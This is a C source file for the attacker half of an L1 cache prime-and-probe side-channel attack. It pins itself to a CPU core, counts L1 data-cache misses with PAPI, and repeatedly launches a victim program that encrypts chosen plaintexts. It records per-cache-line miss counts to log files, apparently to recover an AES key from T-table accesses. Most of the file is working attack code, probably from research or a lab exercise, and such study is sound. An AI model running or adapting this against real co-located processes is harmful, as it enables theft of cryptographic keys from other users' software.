#define _GNU_SOURCE              

#include <papi.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>


#define WAIT_TIME_T 5000
#define N_MEAS_T 200

#define WAIT_TIME 15000
#define N_MEAS 500

#define L1_LINES 64
#define INNER_REPETITIONS 10000     //  number of times a measurement of a given L1 line is performed
#define LOGICAL_CORE 3              //  logical core where this process will run on
#define SIZE32KB (32*1024)          //  represents 32 KB
#define W 8                         //  associativity number of L1
#define STRIDE (SIZE32KB/W)         //  step distance between the consecutive accesses in order to fill a particular line of L1
#define C_BLOCK_SIZE 64             //  bytes space between each attacker thread [block size=64]


void cpu_setup();
void papi_config(int * retval, int * eventSet);
void get_plaintexts_t( char * plaintext,  char * plaintext2, int table_index, int min, int max);
void get_p(char * plaintext);
void set_args(unsigned char * plaintext, unsigned char *  key, char * args[]);
int L1_line_translator( void * addr );
int L1_cache_block_offset_translator( void * addr);
int handle_error(int code, char *outstring);

char V[SIZE32KB];                   

int main(void) { 


    cpu_setup();


    long_long values[2];
    int retval, EventSet=PAPI_NULL;
    papi_config(&retval, &EventSet);
    srand(time(NULL));   

    FILE* logfile;
    char file_name[35];
    register int min;
    register int i;
    register int ii;                        
    register int v_line = L1_line_translator(V); // check this if gives value diff from 0 // this has to be included on the fill

    char * args[5]; // should be char * const instead, check this
    int pid  = 0;
    char plaintext[16*(3+1)+1];
    char plaintext2[16*(3+1)+1];
    double final_score[L1_LINES] = {0};
    double final_score2[L1_LINES] = {0};



    printf("v_line:%d\n",v_line); // must be considered in the extractions


    for(int j = 0; j < N_MEAS_T ; j++){

        if(j%2 == 0){
            get_plaintexts_t(plaintext,plaintext2,0,0,16);
            printf("Plain Main: %s\n",plaintext);
        }
        if(j%2 == 1) {
            strcpy(plaintext,plaintext2);
            printf("Plain Custom: %s\n",plaintext);
        }

    
        args[0] = "./vic";
        args[1] = plaintext;
        args[2] = "key";
        args[3] =  NULL;


        // arguemnts:  args , wait time,  line_score, v_line

        if ( (pid = fork())== 0) 
            execv("./vic", args);

        usleep(WAIT_TIME_T);


        // fill line function/ maybe
    
        for ( min=0; min<SIZE32KB/W; min+=C_BLOCK_SIZE) {

            if (PAPI_reset(EventSet) != PAPI_OK)
                handle_error(1,"reset");
            if (PAPI_read(EventSet, values) != PAPI_OK)
                handle_error(1,"read");
            if (PAPI_start(EventSet) != PAPI_OK)
                handle_error(1,"start");
    
            // ----------------------------------------------
            for (ii = 0; ii < INNER_REPETITIONS ; ii++) {
                for(i = min; i < SIZE32KB; i+= STRIDE)
                    V[i] = V[i] + 1;
            }
            // ----------------------------------------------

            if (PAPI_stop(EventSet, values) != PAPI_OK)
                handle_error(1,"stop");

            if(j%2==0){
                final_score[min/C_BLOCK_SIZE]+= values[0];
            }
            if(j%2==1){
                final_score2[min/C_BLOCK_SIZE]+= values[0];
            }         
        }
        wait(NULL);
    }


    logfile = fopen("side_channel_info/table.out","w");
    for (int l = 0; l<L1_LINES; l++){
        fprintf(logfile,"%f\n", (final_score2[l] - final_score[l]) /N_MEAS);
    }
    fclose(logfile);




    // Measurement loop
    for(int j = 0; j < N_MEAS ; j++){    


        snprintf(file_name, sizeof(file_name), "side_channel_info/meas#%i.out",j);
        logfile = fopen(file_name,"w");
        get_p(plaintext);


        fprintf(logfile,"%s\n", plaintext);
        args[0] = "./vic";
        args[1] = plaintext;
        args[2] =  NULL;

        // fork & creation of a victim
        if ( (pid = fork())== 0) {
            execv("./vic", args);
        }

        // waiting for victim configuration
        usleep(WAIT_TIME);


        for ( min=0 ; min<SIZE32KB/W ; min+=C_BLOCK_SIZE) { 

                if (PAPI_reset(EventSet) != PAPI_OK)
                    handle_error(1,"reset");
                if (PAPI_read(EventSet, values) != PAPI_OK)
                    handle_error(1,"read");
                if (PAPI_start(EventSet) != PAPI_OK)
                    handle_error(1,"start");
        
                // ----------------------------------------------
                for (ii = 0; ii < INNER_REPETITIONS ; ii++) {
                    for(i = min; i < SIZE32KB; i+= STRIDE)
                        V[i] = V[i] + 1;
                }
                // ----------------------------------------------
            
                if (PAPI_stop(EventSet, values) != PAPI_OK)
                    handle_error(1,"stop");


                // fprintf() WARNING!!
                // can be placed outside, in order to loop 
                // to perform the same amount of SCI extractions
                // and victim perform a less number of encryptions 
                fprintf(logfile,"%lld\n", values[0]);    
        }

        fclose(logfile);

        wait(NULL);// or kill(child_pid, SIGKILL);
    }

    return 0;

}


void get_plaintexts_t( char * plaintext, char * plaintext2, int table_index, int min, int max){
    
    int rand_value;
    char num[4];

    plaintext[0] = '\0';
    plaintext2[0] = '\0';

    for (int i= 0; i<16; i++){
        if(i%4 == table_index) {
            rand_value = (random()%256-max)+(max-min);
            snprintf(num, sizeof(num)+1, "%i.", rand_value);
            strcat(plaintext,num);

            rand_value = (random()%(max-min))+(min);
            snprintf(num, sizeof(num)+1, "%i.", rand_value);
            strcat(plaintext2,num);
        }
        else{

            rand_value = random()%256;
            snprintf(num, sizeof(num)+1, "%i.", rand_value); // +1 because of '\0'
            strcat(plaintext, num);
            strcat(plaintext2, num);
        }
    }
}




void get_p(char * plaintext){
    
    int rand_value;
    char num[4];

    plaintext[0] = '\0';

    for (int i= 0; i<16; i++){
        rand_value = random()%256;    // change it to better random mech 
        snprintf(num, sizeof(num)+1, "%i.", rand_value); // +1 because of '\0'
        // to uncomment
        strcat(plaintext, num); 
    }
    // to delete
    // strcpy(plaintext, "226.249.59.155.129.247.174.93.155.122.235.166.203.71.151.15.");

}




void papi_config(int * retval, int * EventSet){

        *retval = PAPI_library_init(PAPI_VER_CURRENT);
    if (*retval != PAPI_VER_CURRENT) { 
        fprintf(stderr, "PAPI library init error!\n");
        exit(1);
    }
    if (PAPI_create_eventset(EventSet) != PAPI_OK)
        handle_error(1, "create_eventset");
    if (PAPI_add_event(*EventSet, PAPI_L1_DCM)!= PAPI_OK) 
        handle_error(1,"add_event");
}


void cpu_setup(){

    cpu_set_t mask;
    CPU_ZERO( &mask );                                              // clears the set mask
    CPU_SET( LOGICAL_CORE, &mask );                                 // adds the cpu to the mask set
    if( sched_setaffinity( getpid(), sizeof(mask), &mask ) == -1 ){ // sets the CPU affinity mask of the process
        printf("WARNING: Could not set CPU Affinity...\n");
    }
}

int L1_line_translator( void * addr) {

    uint64_t n = (uintptr_t) (addr);
    uint64_t x = (n>>6)%SIZE32KB%64;    
    return (int) x;
}

int L1_cache_block_offset_translator( void * addr) {

    uint64_t n = (uintptr_t) (addr);
    uint64_t x = n%SIZE32KB%64;    
    return (int) x;
}

int handle_error(int code, char *outstring){
    
    printf("Error in PAPI function call %s\n", outstring);
    PAPI_perror("PAPI Error");
    exit(1);
}
